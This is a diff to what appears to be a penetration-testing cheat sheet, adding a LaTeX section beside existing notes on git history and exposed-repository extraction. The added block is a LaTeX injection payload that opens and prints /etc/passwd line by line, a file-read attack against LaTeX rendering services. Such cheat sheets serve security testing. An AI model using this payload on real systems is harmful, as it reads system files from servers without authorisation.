@@ -51,6 +51,17 @@
 
   - **Show full history**
     - `git log --patch --follow -- text.txt > full_history.txt`
+   
+### Latex
+  - **Read file**
+    ```
+    \renewcommand\r{\ifeof\file\else\read\file to\line\line\r\fi}
+    \catcode`_=3
+    \newread\file
+    \openin\file=/etc/passwd
+    \r
+    \closein\file
+    ```
 
   - **Extract all files**
     - [https://github.com/internetwache/GitTools/tree/master/Extractor](https://github.com/internetwache/GitTools/tree/master/Extractor)
